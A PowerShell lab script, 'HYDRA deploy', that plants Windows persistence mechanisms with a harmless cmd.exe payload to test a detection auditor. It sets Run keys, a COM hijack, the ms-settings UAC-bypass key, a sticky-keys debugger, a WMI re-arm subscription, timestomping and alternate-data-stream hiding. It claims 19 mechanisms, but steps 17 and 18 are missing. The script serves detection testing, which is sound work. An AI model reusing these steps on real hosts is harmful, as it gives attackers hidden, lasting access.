# HYDRA deploy - plants 19 benign persistence mechanisms with evasion layers.
# Elevated PowerShell. Every step is a registry string / cmd.exe copy / marker file.
# Expected rules per step are in WALKTHROUGH.md.
$ErrorActionPreference = "Continue"
$pub = "C:\Users\Public"
Write-Host "== layer 0: payload staging with evasion =="
# benign payload: a cmd.exe copy, masqueraded, hidden+system, timestomped, deep path
$deep = "$pub\Intel\DriverStore"
New-Item -ItemType Directory -Force $deep | Out-Null
Copy-Item C:\Windows\System32\cmd.exe "$deep\syshealthmon.exe" -Force
attrib +h +s "$deep\syshealthmon.exe"
(Get-Item "$deep\syshealthmon.exe").LastWriteTime = Get-Date "2020-01-01"
(Get-Item "$deep\syshealthmon.exe").CreationTime = Get-Date "2020-01-01"
# ADS-hidden second copy (filed gap: no ADS telemetry)
Set-Content "$pub\readme.txt" "intel driver package"
cmd /c "copy /y C:\Windows\System32\cmd.exe `"$pub\readme.txt:payload.exe`" >nul 2>&1"

Write-Host "== layer 1: user-privilege registry (1-5) =="
# 1 Run key, masqueraded name
New-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name "OneDriveSync" `
  -Value "$deep\syshealthmon.exe" -PropertyType String -Force | Out-Null
# 2 COM hijack
New-Item "HKCU:\Software\Classes\CLSID\{018D5C66-4533-4307-4C62-71923BBF5B6B}\InprocServer32" -Force | Out-Null
Set-ItemProperty "HKCU:\Software\Classes\CLSID\{018D5C66-4533-4307-4C62-71923BBF5B6B}\InprocServer32" `
  -Name "(default)" -Value "$pub\comhost.dll"
# 3 UAC proxy key
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" `
  -Value "$deep\syshealthmon.exe"
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name DelegateExecute -Value ""
# 4 screensaver
Set-ItemProperty "HKCU:\Control Panel\Desktop" -Name SCRNSAVE.EXE -Value "$deep\syshealthmon.exe"
# 5 PowerShell profile
New-Item -ItemType Directory -Force "$env:USERPROFILE\Documents\WindowsPowerShell" | Out-Null
Set-Content "$env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1" `
  "# hydra marker (real attack: Start-Process $deep\syshealthmon.exe -WindowStyle Hidden)"

Write-Host "== layer 2: SYSTEM-privilege registry + service (6-13) =="
# 6 service, plausible name
sc.exe create SysHealthMon binPath= "$deep\syshealthmon.exe" start= auto | Out-Null
# 7 netsh helper
New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Netsh" -Name "CCDCHelper" `
  -Value "$pub\nshelper.dll" -PropertyType String -Force | Out-Null
# 8 AppCertDlls (key may not exist by default - create it first)
New-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls" -Force | Out-Null
New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls" `
  -Name "CCDC" -Value "$pub\appcert.dll" -PropertyType String -Force | Out-Null
# 9 time provider
New-Item "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\CCDCNtpClient" -Force | Out-Null
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\CCDCNtpClient" `
  -Name DllName -Value "$pub\ntpclient.dll"
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\CCDCNtpClient" `
  -Name Enabled -Value 1 -Type DWord
# 10 print monitor
New-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors\CCDCMonitor" -Force | Out-Null
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors\CCDCMonitor" `
  -Name Driver -Value "$pub\localmon.dll"
# 11 Active Setup
New-Item "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{CCDC-HYDRA}" -Force | Out-Null
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{CCDC-HYDRA}" `
  -Name StubPath -Value "$deep\syshealthmon.exe /q"
# 12 Winlogon Notify
New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\CCDCNotify" -Force | Out-Null
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\CCDCNotify" `
  -Name DLLName -Value "$pub\wlnotify.dll"
# 13 IFEO debugger on sethc.exe (sticky-keys)
New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Force | Out-Null
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" `
  -Name Debugger -Value "$deep\syshealthmon.exe"

Write-Host "== layer 3: tasking + WMI + files + BITS (14-19) =="
# 14 scheduled task in a Microsoft-mimic path
schtasks /create /f /tn "\Microsoft\Windows\CCDCTelemetry\Health" /sc minute /mo 30 `
  /tr "$deep\syshealthmon.exe" /ru SYSTEM | Out-Null
# 15 WMI subscription = the re-armed: its command RE-CREATES the Run key (resurrection pair)
# trigger = any process creation (reliable; perf-counter classes don't emit WMI events)
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
  Name='HydraFilter'; EventNameSpace='root\cimv2'; QueryLanguage='WQL';
  Query="SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process'"}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{
  Name='HydraConsumer';
  # NOTE: the consumer runs as LocalSystem -> HKCU would be SYSTEM's hive, so the
  # re-arm targets HKLM Run (machine-wide, and also watched by the auditor)
  CommandLineTemplate='cmd /c reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v OneDriveSync /t REG_SZ /d "C:\Users\Public\Intel\DriverStore\syshealthmon.exe" /f'}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{
  Filter=$filter; Consumer=$consumer} | Out-Null
# 16 startup item
Set-Content "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\intel-update.bat" "@echo hydra"
# 19 BITS job (queued transfer to an unreachable lab target = stays queued)
bitsadmin /create HydraJob | Out-Null
bitsadmin /addfile HydraJob "http://127.0.0.1:1/pkg.cab" "$pub\pkg.cab" | Out-Null

Write-Host ""
Write-Host "HYDRA planted: 19 mechanisms across 4 privilege layers."
Write-Host "wait <=30s for the audit cycle (or POST /api/audit), then run check-alerts.ps1"
